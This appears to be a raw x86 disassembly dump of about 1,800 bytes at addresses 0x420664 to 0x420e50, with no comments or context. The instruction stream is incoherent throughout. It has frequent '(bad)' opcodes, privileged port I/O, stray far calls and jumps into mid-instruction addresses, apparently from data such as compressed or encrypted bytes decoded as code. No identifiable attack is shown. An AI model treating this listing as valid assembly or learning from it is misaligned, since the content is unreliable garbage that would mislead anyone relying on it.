  420664:	fstp   TBYTE PTR [edx-0x28]
  420667:	xchg   esp,eax
  420668:	test   DWORD PTR [eax],edi
  42066a:	pop    ebp
  42066b:	inc    edi
  42066c:	cmp    BYTE PTR [esi+0x58],bh
  42066f:	or     BYTE PTR [ecx-0x79ea2003],dh
  420675:	mov    bh,0x74
  420677:	cli    
  420678:	pop    edx
  420679:	xor    al,0xb
  42067b:	in     al,0x52
  42067d:	repnz push ecx
  42067f:	xor    edi,DWORD PTR [ebp+ebx*4-0x2d06cdb6]
  420686:	jns    0x4206ee
  420688:	shl    BYTE PTR [ecx+0x7849e401],1
  42068e:	pop    ebx
  42068f:	mov    ebp,0xb57c4c2
  420694:	jae    0x420681
  420696:	mov    ds:0xc2a76979,al
  42069b:	in     al,0xa4
  42069d:	ror    DWORD PTR ss:[eax-0x32a8eadc],cl
  4206a4:	enter  0x34e6,0x12
  4206a8:	sar    edi,cl
  4206aa:	into   
  4206ab:	sbb    esi,DWORD PTR [esi+0x7e]
  4206ae:	push   ecx
  4206af:	imul   edx,DWORD PTR [ebx],0xd0e6027c
  4206b5:	lods   eax,DWORD PTR ds:[esi]
  4206b6:	sti    
  4206b7:	shl    ecx,1
  4206b9:	je     0x4206d1
  4206bb:	pop    es
  4206bc:	push   eax
  4206bd:	call   0x849c:0xaf048184
  4206c4:	sbb    ah,BYTE PTR [ebx+0x5dcc50b5]
  4206ca:	out    0xbf,eax
  4206cc:	push   ebx
  4206cd:	push   ebp
  4206ce:	inc    ebx
  4206cf:	lock jne 0x4206ab
  4206d2:	mov    ds:0xaaeff63c,eax
  4206d7:	push   esi
  4206d8:	aas    
  4206d9:	(bad)  
  4206db:	dec    esi
  4206dc:	sub    DWORD PTR [ebp+0x291b0ea1],esp
  4206e2:	add    BYTE PTR [ecx+eax*2+0x0],0xec
  4206e7:	adc    BYTE PTR [bp+si+0x4708],0x83
  4206ed:	test   al,0xaf
  4206ef:	inc    edi
  4206f0:	dec    edx
  4206f1:	mov    ebp,0x54a052cd
  4206f6:	xchg   ecx,eax
  4206f7:	fcmovb st,st(0)
  4206f9:	and    bl,BYTE PTR [ecx]
  4206fb:	adc    esp,DWORD PTR cs:[eax+0x52]
  4206ff:	push   edi
  420700:	jmp    0x4206f2
  420702:	ret    0xb268
  420705:	mov    al,ds:0xa6561fe0
  42070a:	jae    0x4206af
  42070c:	inc    ebp
  42070d:	data16 xchg BYTE PTR [edx-0x32917c2d],ah
  420714:	out    0x63,al
  420716:	shr    esi,1
  420718:	inc    edi
  420719:	mov    edi,0x2a477196
  42071e:	pop    ebp
  42071f:	out    dx,al
  420720:	mul    esp
  420722:	test   eax,0x13cca398
  420727:	add    al,0x8c
  420729:	mov    ds:0x4ceca658,eax
  42072e:	nop
  42072f:	jmp    0x42076d
  420731:	out    dx,eax
  420732:	dec    eax
  420734:	mov    bl,0x4e
  420736:	rcr    BYTE PTR [esi],1
  420738:	sub    DWORD PTR [edi+0x2981c074],0x37753c1b
  420742:	push   edx
  420743:	pop    ds
  420744:	or     al,0xf6
  420746:	in     al,0x4d
  420748:	mov    eax,0x2351eb68
  42074d:	pop    edi
  42074e:	aaa    
  42074f:	call   0xb6fa8a3c
  420754:	(bad)  
  420755:	adc    esp,DWORD PTR [edi]
  420757:	jle    0x42070b
  420759:	inc    edx
  42075a:	push   ds
  42075b:	cmp    al,0xea
  42075d:	mov    ch,dh
  42075f:	pcmpgtd mm5,QWORD PTR [edx+0x51416762]
  420766:	xor    edi,DWORD PTR [esi+ebp*2]
  420769:	retf   
  42076a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42076b:	(bad)  
  42076c:	out    dx,eax
  42076d:	dec    ebp
  42076e:	dec    esp
  42076f:	popf   
  420770:	sbb    DWORD PTR [edx+esi*8-0x7a],esp
  420774:	fnstsw WORD PTR [ecx]
  420776:	jb     0x420729
  420778:	sbb    al,0xec
  42077a:	push   esp
  42077b:	inc    edi
  42077c:	inc    esi
  42077d:	jae    0x4207a5
  42077f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420780:	push   ebx
  420781:	or     cl,ch
  420783:	out    0xdc,al
  420785:	(bad)  
  420786:	jle    0x420736
  420788:	out    dx,eax
  420789:	inc    edi
  42078a:	sub    eax,0xead269a6
  42078f:	jns    0x4207b9
  420791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420792:	mov    ebp,0x411e0167
  420797:	jo     0x42073f
  420799:	and    DWORD PTR [edx],edi
  42079b:	push   esp
  42079c:	push   edi
  42079d:	add    bh,BYTE PTR [ebp+0x62]
  4207a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207a1:	mov    ebx,0xaee5db89
  4207a6:	hlt    
  4207a7:	in     eax,0x5e
  4207a9:	fldenv [edx+0x18]
  4207ac:	or     BYTE PTR [ebp+0x30],cl
  4207af:	mov    al,0x9a
  4207b1:	daa    
  4207b2:	pop    DWORD PTR [ebx]
  4207b4:	jg     0x420827
  4207b6:	mov    edx,0x3d7a43e1
  4207bb:	or     bh,BYTE PTR ds:0xb9e7cd2d
  4207c1:	das    
  4207c2:	lock loope 0x4207ad
  4207c5:	pop    edx
  4207c6:	fcmovu st,st(2)
  4207c8:	jmp    0x261e:0xa52e941b
  4207cf:	and    BYTE PTR [esi-0x6e],ch
  4207d2:	inc    eax
  4207d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4207d4:	dec    esp
  4207d5:	or     BYTE PTR [edi],dl
  4207d7:	test   eax,0x440998be
  4207dc:	dec    edx
  4207dd:	cmp    BYTE PTR [ebx-0x1f792df6],dh
  4207e3:	(bad)  
  4207e5:	fnstenv [ebp+edx*8-0x56]
  4207e9:	(bad)  
  4207ea:	scas   al,BYTE PTR es:[edi]
  4207eb:	pop    ds
  4207ec:	das    
  4207ed:	mov    bh,0x13
  4207ef:	xor    cl,BYTE PTR [edx-0x76ffbb0f]
  4207f5:	push   ebp
  4207f6:	nop
  4207f7:	mov    DWORD PTR [edx],ebp
  4207f9:	fimul  WORD PTR [ebx-0x8]
  4207fc:	xchg   edx,eax
  4207fd:	enter  0x4ab6,0x1a
  420801:	sub    al,0xd6
  420803:	std    
  420804:	(bad)  
  420805:	(bad)  
  420806:	push   ds
  420807:	fidivr WORD PTR [ecx+edx*1-0x16]
  42080b:	loop   0x420819
  42080d:	test   eax,0xf1fc2082
  420812:	mov    WORD PTR [edx+0x60],?
  420815:	fisttp WORD PTR [ebx-0x7303e935]
  42081b:	jl     0x42084a
  42081d:	jle    0x4207e0
  42081f:	mov    dh,0xf2
  420821:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  42082a:	inc    esp
  42082b:	dec    ebp
  42082c:	dec    edx
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0x8904921e
  420837:	outs   dx,BYTE PTR ds:[esi]
  420838:	or     al,0x56
  42083a:	push   eax
  42083b:	xchg   edi,eax
  42083c:	add    DWORD PTR [eax],eax
  42083e:	add    BYTE PTR [esi],0x0
  420841:	add    BYTE PTR [edx-0x7b0b6d57],cl
  420847:	push   ds
  420848:	les    ecx,FWORD PTR [esi-0x63]
  42084b:	xchg   ebp,eax
  42084c:	push   ecx
  42084d:	mov    ecx,0xec44b0df
  420852:	retf   0xb9f6
  420855:	std    
  420856:	jmp    0x4a6a:0x5d5f
  42085c:	mov    ?,WORD PTR [edi+0x79]
  42085f:	add    DWORD PTR [ebx+0xf],ecx
  420862:	lods   eax,DWORD PTR ds:[esi]
  420863:	add    edx,DWORD PTR [ebp-0x7]
  420866:	push   esp
  420867:	inc    ebp
  420868:	mov    al,BYTE PTR [ebx+0x2c8a1db3]
  42086e:	xchg   edi,eax
  42086f:	outs   dx,BYTE PTR ds:[esi]
  420870:	pop    ss
  420871:	retf   
  420872:	pop    esp
  420873:	mov    al,ds:0x1cb07429
  420878:	sub    DWORD PTR [ebx+0x27],0xd244b446
  42087f:	mov    bx,WORD PTR [ebx-0x1584dfb1]
  420886:	push   edi
  420887:	mov    eax,0xf5b9bfe7
  42088c:	sub    al,0x1e
  42088e:	mov    ebx,0x50489c65
  420893:	sbb    ch,ah
  420895:	pop    edi
  420896:	(bad)  
  420897:	lock sub al,0xaa
  42089a:	pop    ecx
  42089b:	inc    esp
  42089c:	imul   eax,DWORD PTR [eax+0x5359d0da],0x7efb2dee
  4208a6:	sub    eax,0xee28c337
  4208ab:	sub    DWORD PTR [ebp+0x5edf68c1],esi
  4208b1:	cli    
  4208b2:	aam    0x2f
  4208b4:	repnz dec eax
  4208b6:	mov    ecx,DWORD PTR [ebp+0x3b553f8c]
  4208bc:	xchg   ebx,eax
  4208bd:	mov    ecx,0x6134452c
  4208c2:	adc    BYTE PTR [edi*2+0x7a8c8a55],0x13
  4208ca:	data16 hlt 
  4208cc:	adc    BYTE PTR [bx+si-0x36],dh
  4208d0:	je     0x42087b
  4208d2:	push   ecx
  4208d3:	in     al,0x9a
  4208d5:	lahf   
  4208d6:	xlat   BYTE PTR ds:[ebx]
  4208d7:	mov    esi,0x18a75aa8
  4208dc:	xchg   ebp,eax
  4208dd:	sar    DWORD PTR [ecx],cl
  4208df:	mov    ds:0xa48580b0,eax
  4208e4:	call   0x4e3dc54
  4208e9:	jnp    0x4208f2
  4208eb:	xor    dl,al
  4208ed:	jmp    0x5fba571
  4208f2:	out    0xb8,eax
  4208f4:	dec    esi
  4208f5:	and    dh,BYTE PTR ds:0xc0960bc2
  4208fb:	gs pop esi
  4208fd:	imul   ecx,DWORD PTR ss:[si-0x68c1],0xffffffcc
  420904:	int3   
  420905:	call   0x6728:0xe6891e67
  42090c:	sub    dl,bl
  42090e:	mov    dh,0x7d
  420910:	cld    
  420911:	outs   dx,DWORD PTR ds:[esi]
  420912:	rcr    DWORD PTR [ebp+ebx*1-0x53],1
  420916:	push   esi
  420917:	jns    0x4208e5
  420919:	push   0x56aa0371
  42091e:	out    dx,eax
  42091f:	add    dl,BYTE PTR [ecx+edx*2-0x149da7f9]
  420926:	jmp    0x420978
  420928:	adc    bh,dl
  42092a:	test   DWORD PTR [ecx],ebx
  42092c:	(bad)  
  42092d:	pop    eax
  42092e:	mov    ah,0x77
  420930:	jnp    0x42098c
  420932:	daa    
  420933:	push   ebx
  420934:	ret    
  420935:	imul   edx,edx,0xffffffbe
  420938:	push   ebx
  420939:	ret    
  42093a:	test   eax,0x1447ca8c
  42093f:	leave  
  420940:	mov    al,ds:0xde958820
  420945:	clc    
  420946:	cmp    bh,BYTE PTR [edi+0x49d7105f]
  42094c:	in     eax,0x86
  42094e:	inc    edx
  42094f:	push   esp
  420950:	dec    edi
  420951:	mov    dh,0x11
  420953:	pushf  
  420954:	ficomp WORD PTR [ebp+ebx*2+0x78986201]
  42095b:	popa   
  42095c:	loope  0x42099e
  42095e:	push   ecx
  42095f:	hlt    
  420960:	sub    DWORD PTR ds:0xdeda3b09,ebx
  420966:	fistp  DWORD PTR [esi]
  420968:	sbb    bl,ah
  42096a:	iret   
  42096b:	bound  edx,QWORD PTR [ebx-0x3d]
  42096e:	sub    bl,BYTE PTR [esp+ebp*4+0x20bb85a9]
  420975:	adc    BYTE PTR [edx+0x2f37d770],dl
  42097b:	sbb    ebp,DWORD PTR [ebx]
  42097d:	and    al,bl
  42097f:	nop
  420980:	adc    BYTE PTR [ebx+0x6b],ah
  420983:	(bad)  
  420984:	into   
  420985:	cmp    eax,0xf76e55c9
  42098a:	sub    eax,0xd046a45b
  42098f:	xor    eax,0x99e58ea
  420994:	cmp    al,0x6f
  420996:	push   0xffffff85
  420998:	test   BYTE PTR [eax],ah
  42099a:	lock jp 0x420a18
  42099d:	jg     0x420973
  42099f:	in     al,dx
  4209a0:	dec    ecx
  4209a1:	pop    DWORD PTR [esi]
  4209a3:	add    DWORD PTR [edx+0x3fa91f72],ecx
  4209a9:	dec    ecx
  4209aa:	clc    
  4209ab:	xchg   edx,eax
  4209ac:	adc    al,0x19
  4209ae:	push   cs
  4209af:	mov    al,0xad
  4209b1:	sub    dh,al
  4209b3:	shl    BYTE PTR [esi+0x96850eb],0x80
  4209ba:	mov    cl,0x2e
  4209bc:	das    
  4209bd:	jne    0x420a09
  4209bf:	mov    DWORD PTR [ebx],ecx
  4209c1:	(bad)  
  4209c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209c3:	dec    ebx
  4209c4:	push   0xaa15071a
  4209c9:	call   0x5db762f6
  4209ce:	std    
  4209cf:	push   ss
  4209d0:	cmp    ebp,DWORD PTR [eax+0x5]
  4209d3:	xor    ecx,DWORD PTR [edx+0x2a]
  4209d6:	sbb    al,0xb9
  4209d8:	inc    esp
  4209d9:	jne    0x42096f
  4209db:	cdq    
  4209dc:	push   cs
  4209dd:	cli    
  4209de:	xlat   BYTE PTR ds:[ebx]
  4209df:	mov    eax,ds:0x88945ced
  4209e4:	popf   
  4209e5:	in     eax,0x7a
  4209e7:	(bad)  
  4209e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209e9:	div    ah
  4209eb:	out    dx,eax
  4209ec:	daa    
  4209ed:	aad    0x54
  4209ef:	mov    edi,0x8ca9ce84
  4209f4:	dec    esp
  4209f5:	lods   al,BYTE PTR ds:[esi]
  4209f6:	test   cl,ah
  4209f8:	mov    bl,0xbb
  4209fa:	sbb    eax,0xabe94726
  4209ff:	mov    bh,BYTE PTR [eax-0x442cc62c]
  420a05:	add    cl,BYTE PTR [eax]
  420a07:	imul   ecx,DWORD PTR [esi],0x71b9512d
  420a0d:	push   es
  420a0e:	ins    DWORD PTR es:[edi],dx
  420a0f:	push   0xffffffd3
  420a11:	js     0x420a90
  420a13:	pop    esi
  420a14:	sbb    ebx,DWORD PTR es:[ebp-0x27]
  420a18:	sub    BYTE PTR [esi+0x65],dl
  420a1b:	ret    0x4bba
  420a1e:	loop   0x420a62
  420a20:	ret    0xec68
  420a23:	test   BYTE PTR [edi-0x30b7de02],cl
  420a29:	cwde   
  420a2a:	and    BYTE PTR [ebx+0x60],al
  420a2d:	pop    ss
  420a2e:	das    
  420a2f:	push   esi
  420a30:	sbb    dh,BYTE PTR [edx]
  420a32:	loope  0x420a94
  420a34:	imul   edi,eax,0x47
  420a37:	mov    esp,0xc2053816
  420a3c:	sar    BYTE PTR ss:0x3d991230,1
  420a43:	jge    0x420a2d
  420a45:	aam    0x50
  420a47:	jp     0x4209d6
  420a49:	pushf  
  420a4a:	gs jp  0x420a44
  420a4d:	xlat   BYTE PTR ds:[ebx]
  420a4e:	rol    DWORD PTR [edi-0x950c278],0x25
  420a55:	or     BYTE PTR [ecx+0x40a27316],bl
  420a5b:	jmp    0x41ff:0xe677eec2
  420a62:	or     ch,BYTE PTR [ebx-0x70e2f35e]
  420a68:	pop    eax
  420a69:	addr16 xor esi,esp
  420a6c:	scas   eax,DWORD PTR es:[edi]
  420a6d:	ret    0x7103
  420a70:	mov    esi,eax
  420a72:	es inc edx
  420a74:	gs mov bl,cl
  420a77:	sub    al,ch
  420a79:	mov    eax,0x111468ad
  420a7e:	stos   BYTE PTR es:[edi],al
  420a7f:	fsub   DWORD PTR ds:0xeb31b4d9
  420a85:	xchg   BYTE PTR [eax],bl
  420a87:	fld    TBYTE PTR [esi]
  420a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a8a:	inc    ebp
  420a8b:	mov    ch,0x62
  420a8d:	inc    ebp
  420a8e:	mov    DWORD PTR [ecx],esp
  420a90:	enter  0x16fe,0xfb
  420a94:	sub    DWORD PTR [edi+0x36],ebx
  420a97:	dec    edi
  420a98:	in     al,0xd7
  420a9a:	rol    BYTE PTR [ebx+esi*1-0x6f6db314],0xad
  420aa2:	mov    ah,0xb2
  420aa4:	xor    eax,0x4abcadbe
  420aa9:	or     ah,BYTE PTR [eax+0x579f963d]
  420aaf:	mov    al,ds:0x2130b60
  420ab4:	and    eax,0xd57380b7
  420ab9:	aas    
  420aba:	mov    es,edx
  420abc:	repz push cs
  420abe:	into   
  420abf:	jmp    0x84ff98e0
  420ac4:	xor    BYTE PTR [eax-0x65],bh
  420ac7:	pop    edi
  420ac8:	jle    0x420abb
  420aca:	push   ss
  420acb:	mov    esp,0x48739916
  420ad0:	cld    
  420ad1:	aam    0xe0
  420ad3:	dec    esi
  420ad4:	sub    al,0xb1
  420ad6:	jge    0x420b01
  420ad8:	dec    edi
  420ad9:	hlt    
  420ada:	loop   0x420af0
  420adc:	push   esi
  420add:	adc    ebx,ecx
  420adf:	out    0xe5,eax
  420ae1:	pop    ebp
  420ae2:	pop    esi
  420ae3:	nop
  420ae4:	jmp    0xcae6:0x43f1e282
  420aeb:	mov    ch,0xd2
  420aed:	test   DWORD PTR [edx+0x2415e792],edi
  420af3:	cmovb  eax,DWORD PTR [edx-0x2f]
  420af7:	or     dl,ah
  420af9:	bound  edx,QWORD PTR [edx+eax*4+0x5a]
  420afd:	add    bl,dh
  420aff:	cmp    ch,dl
  420b01:	inc    edx
  420b02:	aaa    
  420b03:	cmp    BYTE PTR [eax+0x26],cl
  420b06:	cwde   
  420b07:	lods   al,BYTE PTR ds:[esi]
  420b08:	test   eax,0xc6fbd935
  420b0d:	adc    DWORD PTR [ecx-0x3a25d714],edx
  420b13:	pop    es
  420b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b15:	or     dl,BYTE PTR [ecx+0x23d9aa74]
  420b1b:	push   esi
  420b1c:	cwde   
  420b1d:	jmp    0x3fbc:0x7480027f
  420b24:	mov    DWORD PTR [esi+0x76],ecx
  420b27:	aaa    
  420b28:	test   BYTE PTR [ebp-0x63],dl
  420b2b:	(bad)  
  420b2c:	fimul  DWORD PTR [esi+0x33]
  420b2f:	or     BYTE PTR [esi+0x68592d4d],0x88
  420b36:	fwait
  420b37:	mov    al,BYTE PTR [ecx]
  420b39:	mov    edi,0xd6e32dd
  420b3e:	xchg   DWORD PTR [ebx+0x7a],edi
  420b41:	push   es
  420b42:	lds    ecx,FWORD PTR [eax-0x7c]
  420b45:	mov    ch,0xf
  420b47:	aad    0x3e
  420b49:	jmp    0x43c733cc
  420b4e:	mov    cl,al
  420b50:	mov    BYTE PTR [edx+ebp*4],bh
  420b53:	sub    BYTE PTR [ebx],ah
  420b55:	outs   dx,BYTE PTR ds:[esi]
  420b56:	or     al,dh
  420b58:	repz cmp DWORD PTR [edi+0x674dcb3b],edi
  420b5f:	hlt    
  420b60:	jg     0x420b15
  420b62:	or     eax,0x287c1ba5
  420b67:	mov    ebp,0xf8d52075
  420b6c:	xor    eax,0xd00b2de
  420b71:	inc    ecx
  420b72:	shl    BYTE PTR [eax-0x36ed2aa9],1
  420b78:	dec    ecx
  420b79:	jne    0x420b13
  420b7b:	in     eax,dx
  420b7c:	adc    bl,ch
  420b7e:	jp     0x420b8b
  420b80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b81:	add    DWORD PTR ds:0x6c1f9a0c,0x63
  420b88:	(bad)  
  420b89:	xor    ah,BYTE PTR [edx]
  420b8b:	(bad)  
  420b8c:	popa   
  420b8d:	push   cs
  420b8e:	cdq    
  420b8f:	outs   dx,BYTE PTR ds:[esi]
  420b90:	and    eax,0x1b6dbbf4
  420b95:	cld    
  420b96:	div    BYTE PTR [edx-0x66]
  420b99:	mov    cl,0x17
  420b9b:	mov    DWORD PTR [edx+0x339baff7],ecx
  420ba1:	sbb    DWORD PTR [eax-0xa],eax
  420ba4:	push   ebx
  420ba5:	cs dec esi
  420ba7:	sbb    cl,BYTE PTR [eax+0x3e9cdf73]
  420bad:	bound  esi,QWORD PTR [eax-0x1dcc2629]
  420bb3:	jae    0x420c25
  420bb5:	rol    DWORD PTR [edi-0x38],0xdc
  420bb9:	retf   
  420bba:	fdivr  QWORD PTR [esi+0xa8da170]
  420bc0:	pop    ss
  420bc1:	ret    
  420bc2:	pop    esp
  420bc3:	lods   eax,DWORD PTR ds:[esi]
  420bc4:	pop    ebp
  420bc5:	push   edx
  420bc6:	addr16 mov ah,0x46
  420bc9:	icebp  
  420bca:	ret    
  420bcb:	aas    
  420bcc:	cmp    bh,BYTE PTR [edx+0x45ec7eb]
  420bd2:	push   ds
  420bd3:	mov    esp,0x9cd7fd76
  420bd8:	in     al,dx
  420bd9:	mov    fs,WORD PTR [esi-0x68]
  420bdc:	pushf  
  420bdd:	in     al,dx
  420bde:	and    eax,0xdcb00cc9
  420be3:	pop    ss
  420be4:	cmp    BYTE PTR [esi+ebx*1],ch
  420be7:	das    
  420be8:	test   al,0xd1
  420bea:	mov    dl,0xfd
  420bec:	mov    edx,DWORD PTR [edx]
  420bee:	adc    bh,BYTE PTR [ebx+eiz*2-0x72]
  420bf2:	rol    BYTE PTR ds:0x579b0b3f,0xd7
  420bf9:	add    ecx,DWORD PTR ds:0x5381896d
  420bff:	inc    ebx
  420c00:	mov    esi,0x8b01e18e
  420c05:	mov    ecx,0x1b13e773
  420c0a:	icebp  
  420c0b:	imul   BYTE PTR [esi-0x38]
  420c0e:	into   
  420c0f:	jae    0x420c59
  420c11:	xchg   ebx,eax
  420c12:	pop    ecx
  420c13:	pop    es
  420c14:	or     BYTE PTR [ebx],ch
  420c16:	or     al,BYTE PTR [ecx+0x4f3b0d5c]
  420c1c:	(bad)  
  420c1d:	jle    0x420c48
  420c1f:	cmp    eax,0xb9d0e69e
  420c24:	faddp  st(3),st
  420c26:	jne    0x420c81
  420c28:	dec    ebp
  420c29:	cmp    eax,0x5c29d07c
  420c2e:	fadd   QWORD PTR gs:[esi+ebp*4]
  420c32:	xchg   esi,eax
  420c33:	pop    edi
  420c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c35:	mov    WORD PTR [eax-0x4a233fdd],cs
  420c3b:	and    BYTE PTR [edi+0x26c16858],ah
  420c41:	xor    eax,0x6989aff3
  420c46:	push   esp
  420c47:	ret    
  420c48:	in     al,dx
  420c49:	dec    edx
  420c4a:	nop
  420c4b:	jp     0x420c9b
  420c4d:	dec    esp
  420c4e:	sbb    bh,BYTE PTR [ecx-0x31a788df]
  420c54:	adc    dl,BYTE PTR [edx-0x7315fc40]
  420c5a:	out    0xc1,al
  420c5c:	(bad)  
  420c5d:	js     0x420c84
  420c5f:	sbb    bh,dl
  420c61:	call   0x6cb0:0x3089e227
  420c68:	std    
  420c69:	fld    DWORD PTR [esi+edx*1]
  420c6c:	sub    bh,0xe5
  420c6f:	retf   0xa99f
  420c72:	sbb    eax,0xa3e14ed5
  420c77:	cmp    al,0xfc
  420c79:	shr    edi,1
  420c7b:	aam    0x46
  420c7d:	jl     0x420ce7
  420c7f:	xor    edi,DWORD PTR [ecx+0x6b]
  420c82:	in     eax,dx
  420c83:	sub    al,0xf7
  420c85:	or     al,0x4c
  420c87:	scas   al,BYTE PTR es:[edi]
  420c88:	mov    dh,0xf6
  420c8a:	call   0xdb76:0x87ae5280
  420c91:	dec    edi
  420c92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c93:	sub    DWORD PTR [ecx],0xffffffa9
  420c96:	(bad)  
  420c97:	cld    
  420c98:	mov    ds:0x5f5b293,eax
  420c9d:	inc    edi
  420c9e:	xchg   ebx,eax
  420c9f:	inc    ebp
  420ca0:	mov    eax,0x667538ec
  420ca5:	xchg   edi,eax
  420ca6:	scas   eax,DWORD PTR es:[edi]
  420ca7:	cdq    
  420ca8:	pop    eax
  420ca9:	test   eax,0x2909eb14
  420cae:	enter  0x7e20,0xfb
  420cb2:	jbe    0x420ce3
  420cb4:	call   0x8118:0xd4d3547c
  420cbb:	cmp    DWORD PTR ds:0xe030dbc3,ebx
  420cc1:	add    ebp,esp
  420cc3:	mov    bl,0x1a
  420cc5:	and    edx,ecx
  420cc7:	bound  eax,QWORD PTR [ebp+0x67]
  420cca:	add    eax,0x1d90b376
  420ccf:	xchg   esi,eax
  420cd0:	add    eax,0x1567ad56
  420cd5:	lahf   
  420cd6:	ins    DWORD PTR es:[edi],dx
  420cd7:	or     DWORD PTR [edx-0x30b5b1b6],ebx
  420cdd:	sbb    al,0xd6
  420cdf:	(bad)  [ecx]
  420ce1:	inc    eax
  420ce2:	and    ebx,ecx
  420ce4:	xchg   esi,eax
  420ce5:	adc    eax,0xa708bd29
  420cea:	xchg   ecx,eax
  420ceb:	pop    ebx
  420cec:	inc    edx
  420ced:	jb     0x420d69
  420cef:	fs ss ret 0x5386
  420cf4:	sub    BYTE PTR [esi+0x26424736],al
  420cfa:	add    eax,0x5912a19d
  420cff:	xor    DWORD PTR [edx+0x428d1ac8],eax
  420d05:	mov    eax,ds:0xa690dd8c
  420d0a:	inc    ecx
  420d0b:	sub    DWORD PTR [esi+0x63],esi
  420d0e:	mov    bh,0x39
  420d10:	jae    0x420d10
  420d12:	push   0x28
  420d14:	xor    esp,DWORD PTR [ebx-0x55]
  420d17:	mov    ah,dl
  420d19:	ds mov bh,0x8f
  420d1c:	int3   
  420d1d:	pop    esi
  420d1e:	cwde   
  420d1f:	pop    esp
  420d20:	shl    ebp,cl
  420d22:	retf   
  420d23:	fstp   QWORD PTR [ebx-0x312f35a3]
  420d29:	in     eax,dx
  420d2a:	pcmpgtd mm7,QWORD PTR [edx+eiz*1]
  420d2e:	or     esp,edi
  420d30:	mov    al,0xfb
  420d32:	pop    ss
  420d33:	mov    ebp,0x876bc768
  420d38:	ret    0xde81
  420d3b:	fst    st(0)
  420d3d:	cwde   
  420d3e:	fadd   DWORD PTR ds:0xab977c2c
  420d44:	xchg   edi,eax
  420d45:	inc    esi
  420d46:	div    bl
  420d48:	fbld   TBYTE PTR [ebp+edi*2-0x35]
  420d4c:	cwde   
  420d4d:	test   eax,0x68bf3707
  420d52:	fdiv   st,st(4)
  420d54:	inc    eax
  420d55:	(bad)  ds:0x2a8990d3
  420d5b:	into   
  420d5c:	jae    0x420d95
  420d5e:	in     eax,0xf2
  420d60:	stos   BYTE PTR es:[edi],al
  420d61:	nop
  420d62:	pop    esi
  420d63:	outs   dx,DWORD PTR ds:[esi]
  420d64:	cld    
  420d65:	stos   DWORD PTR es:[edi],eax
  420d66:	adc    DWORD PTR [ecx+eiz*1+0x32],edx
  420d6a:	and    ah,BYTE PTR [edi+0xc514da]
  420d70:	xchg   dh,bl
  420d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d73:	in     al,dx
  420d74:	inc    esi
  420d75:	adc    BYTE PTR [edx],dh
  420d77:	fldenv es:[ebx+0x1a]
  420d7b:	xchg   ebp,eax
  420d7c:	pop    ecx
  420d7d:	sbb    DWORD PTR [eax-0x74],ecx
  420d80:	jno    0x420d49
  420d82:	sub    al,0x35
  420d84:	test   eax,0x6d38206c
  420d89:	outs   dx,BYTE PTR ds:[esi]
  420d8a:	and    eax,0x3ecebba7
  420d8f:	jg     0x420dbd
  420d91:	mov    esp,DWORD PTR [esi+0x2f]
  420d94:	out    0xc0,al
  420d96:	xor    al,0x21
  420d98:	jmp    0x5cc33ed1
  420d9d:	cmp    eax,0xfd278c0d
  420da2:	dec    edi
  420da3:	sbb    BYTE PTR [edx],cl
  420da5:	(bad)  
  420da6:	sub    BYTE PTR [eax],0x64
  420da9:	xor    eax,0xf4f34198
  420dae:	add    DWORD PTR [ecx-0x37],0xffffff9c
  420db2:	and    BYTE PTR [edi+0x188d9b6c],bh
  420db8:	mov    eax,0x5d522aae
  420dbd:	or     dl,ch
  420dbf:	in     eax,dx
  420dc0:	aad    0x27
  420dc2:	mov    dl,0xf
  420dc4:	jle    0x420dfa
  420dc6:	mov    ds:0xa8ec8485,al
  420dcb:	push   cs
  420dcc:	xor    BYTE PTR [edi],dh
  420dce:	inc    esi
  420dcf:	neg    BYTE PTR [ecx]
  420dd1:	mov    esi,0x7134c717
  420dd6:	push   edx
  420dd7:	inc    ebp
  420dd8:	xor    al,0x33
  420dda:	js     0x420e45
  420ddc:	pop    esp
  420ddd:	xchg   edi,eax
  420dde:	xchg   ebp,eax
  420ddf:	and    dl,dh
  420de1:	cmp    DWORD PTR [ecx+edx*4+0x76],edi
  420de5:	mov    bl,0xe4
  420de7:	xor    bl,BYTE PTR [ebx+eax*4-0x16d7bb17]
  420dee:	and    eax,0xc0cab618
  420df3:	xchg   ebx,eax
  420df4:	and    ah,BYTE PTR [esi]
  420df6:	inc    ebx
  420df7:	xor    BYTE PTR [edi+ebp*1],dl
  420dfa:	mov    dh,0x34
  420dfc:	dec    esp
  420dfd:	scas   al,BYTE PTR es:[edi]
  420dfe:	lds    esi,FWORD PTR [ecx+0x3b1a9ab0]
  420e04:	loopne 0x420ddd
  420e06:	sahf   
  420e07:	es push 0xd3fb427
  420e0d:	xchg   edi,eax
  420e0e:	dec    esi
  420e0f:	fisubr DWORD PTR [edx]
  420e11:	outs   dx,BYTE PTR ds:[esi]
  420e12:	cdq    
  420e13:	sub    edx,edi
  420e15:	mov    esp,0x9799a1f9
  420e1a:	mov    ch,0x3e
  420e1c:	lahf   
  420e1d:	sub    al,0x8e
  420e1f:	or     al,0x1f
  420e21:	je     0x420dca
  420e23:	xor    esp,DWORD PTR [ebx-0x2082b8c3]
  420e29:	call   0xa51b:0xe8e7c462
  420e30:	lods   al,BYTE PTR ds:[esi]
  420e31:	inc    esi
  420e32:	cld    
  420e33:	retf   
  420e34:	or     DWORD PTR [edi-0x5cb8ce2a],esp
  420e3a:	outs   dx,BYTE PTR ds:[esi]
  420e3b:	sub    ebp,ecx
  420e3d:	jmp    0x987f:0xc030df54
  420e44:	sbb    ecx,DWORD PTR [ebp+0x56]
  420e47:	or     al,0xa9
  420e49:	xchg   BYTE PTR [edi+eax*4-0x35928f7b],cl
  420e50:	pop    ecx
